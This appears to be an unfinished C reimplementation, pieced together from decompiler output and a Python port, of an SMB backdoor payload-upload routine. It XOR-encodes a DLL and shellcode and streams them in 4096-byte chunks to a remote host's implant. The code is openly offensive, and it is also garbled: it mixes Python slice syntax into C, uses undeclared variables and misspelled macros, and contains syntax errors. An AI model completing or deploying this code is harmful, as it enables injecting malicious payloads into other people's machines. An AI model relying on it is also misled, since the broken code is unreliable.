int encodePacket(int xor_key, int buf, int size)
{
	    int i;
	    char __xor_key[5];
	    i = 0;
	    *&__xor_key[1] = 0;
	    *__xor_key = xor_key;
	    if (size <= 0)
	        return 0;
	    do
	    {
	        *(BYTE*)(i + buf) ^= __xor_key[i % 4];
	        ++i;
	    }
	    while ( i < size );
return 0;
}

//idk what this is??
char v3 = *(const void **)&FileName[264];
int v19;

int make_smb_request(char *szBuff, unsigned int XorKey)
{
	HGLOBAL hMem;
	char signature[9];                 //also: v16

	int sizeOfPayload = 4869;	   //size of it ( also: v4 )
	unsigned char DLLPayload64[65000]; // DLL in memory ( also: v5 )

	hMem = GlobalAlloc(0x40, (SIZE_T)DLLPayload64[sizeOfPayload + 12]);
	
	memcpy((char *)hMem + sizeOfPayload, v3, (unsigned int)sizeOfPayload);

 	if ( (signed int)&DLLPayload64[sizeOfPayload] % 4 )
    	{
		
	      	v19 = 4 * ((signed int)&DLLPayload64[sizeOfPayload] / 4) + 4;
    	}

	v19 = (int)&DLLPayload64[sizeOfPayload];

	//not sure what this means
	v7 = &unk_42E758;
	dword_42ECE9 = (int)(DLLPayload64 + 3440);
	*(int *)((char *)&dword_42E750 + sizeOfPayload) = (int)DLLPayload64;
	*(int *)((char *)&dword_42E754 + sizeOfPayload) = 1;
	int v8 = sizeOfPayload;
	
	memcpy(hMem, v7, sizeOfPayload);

	encodePacket(XorKey, (int)hMem, v19);

	int v9 = v19 / 4096;
    	int v10 = v19 % 4096;
	
	char buf[4096];
	int i;
	int v12;
	int v13;
	int v14;
	int v11;
	int v22;
	memcpy(&buf, &unk_42E710, 70);
	
	if ( v19 / 4096 > 0 )
	{
		for ( i = 0; ; v11 = i )
		{
			signature = __PAID__(4096, v19);
			*(DWORD *)&signature[8] = v11;	
			encodePacket(XorKey, (int)signature, 12);
			v29 = *(QWORD *)v16;
      v30 = *(DWORD *)&v16[8];
			memcpy(&v31, (char *)hMem + v11, 4096);
			send(s, (char*)buf, 4178, 0);
			recv(s, (char*)recvbuff, 4096, 0);
			if(recvbuff[35] != 0x52 /* decimal 82 */)
			{
          			break;
			}
			v13 = __OFSUB__(v22 + 1, v9);
			v12 = v22++ + 1 - v9 < 0;
			i += 4096;
			if ( !(v12 ^ v13) )
			{
          			break;
			}
		}
	}
	if ( v10 > 0 )
	{
		v25 = htons(v10 + 78);
		v28 = v10 + 13;
		v14 = v9 << 12;
		v26 = v10;
		v27 = v10;
		*(QWORD *)signature = __PAIR__(v10, v19);
		*(DWORD *)&signature[8] = v14;		
		encodePacket(XorKey, (int)signature, 12);
		v30 = *(DWORD *)&signature[8];
    v29 = *(QWORD *)signature;
		memcpy(&v31, (char *)hMem + v14, v10);
		send(s, &buf, v10 + 82, 0);
		recv(s, &recvbuff, 4096, 0);
	}
	GlobalFree(hMem);
}

////SECOND TRY -> FROM PYTHON NOW////

int encodePacket(int xor_key, int buf, int size)
{
	    int i;
	    char __xor_key[5];
	    i = 0;
	    *&__xor_key[1] = 0;
	    *__xor_key = xor_key;
	    if (size <= 0)
	        return 0;
	    do
	    {
	        *(BYTE*)(i + buf) ^= __xor_key[i % 4];
	        ++i;
	    }
	    while ( i < size );
return 0;
}

//https://stackoverflow.com/questions/2029103/correct-way-to-read-a-text-file-into-a-buffer-in-c
void readFile()
{
	char *source = NULL;
	FILE *fp = fopen("foo.dll", "rb");
	if (fp != NULL) {
	    /* Go to the end of the file. */
	    if (fseek(fp, 0L, SEEK_END) == 0) {
		/* Get the size of the file. */
		long bufsize = ftell(fp);
		if (bufsize == -1) { /* Error */ }

		/* Allocate our buffer to that size. */
		source = malloc(sizeof(char) * (bufsize + 1));

		/* Go back to the start of the file. */
		if (fseek(fp, 0L, SEEK_SET) != 0) { /* Error */ }

		/* Read the entire file into memory. */
		size_t newLen = fread(source, sizeof(char), bufsize, fp);
		if ( ferror( fp ) != 0 ) {
		    fputs("Error reading file", stderr);
		} else {
		    source[newLen++] = '\0'; /* Just to be safe. */
		}
	    }
    fclose(fp);
}

free(source); /* Don't forget to call free() later! */
}

int uploadmain()
{
	unsigned int XorKey;
	readFile(); //read file to memory
	int shellcode_size = 6188; //made up number
	
	int data_len = bufsize + shellcode_size; //dataLen = sizeOfFile
	char make_data;
	char *sendArray;
	int ncount = data_len / 4096;
	if (data_len % 4096) > 0)
	{
		ncount += 1
	}
	int i;

	for(i=0; i<ncount; i++)
	{
		//remove this out of the loop
		if( i < ncount-1) {
			smb_length = 4096 + 32 + 34 + 12; //4174
			totalDataCount = SWAP_SHORT(0x1000);  //4096
			byteCount = SWAP_SHORT(0x100D) //4096 + 13 = 4109
			make_data = send_data[i*4096:(i+1)*4096]
		} else {
			smb_length = 4096*i + 32 +34 + 12;
			totalDataCount = (data_len - 4096*i);
			byteCount = (data_len - 4096*i+ 13);
		}

		data_index = (i*0x10);
		data_header = "\x00\x2C\x00\x00"+totalDataCount+"\x00\x00"+data_index+"\x00\x00";
		memcpy(&buf, netBIOS_header, sizeof(netBIOS_header));
		memcpy(&buf, smb_header, sizeof(smb_header));
		memcpy(&buf, transRequest_header, sizeof(transRequest_header));
		memcpy(&buf, XORDATA, 4096);
		send(s, &buf, sizeof(buf)-1, 0);
		recv(s, &recvbuff, 4096, 0);
	}
}
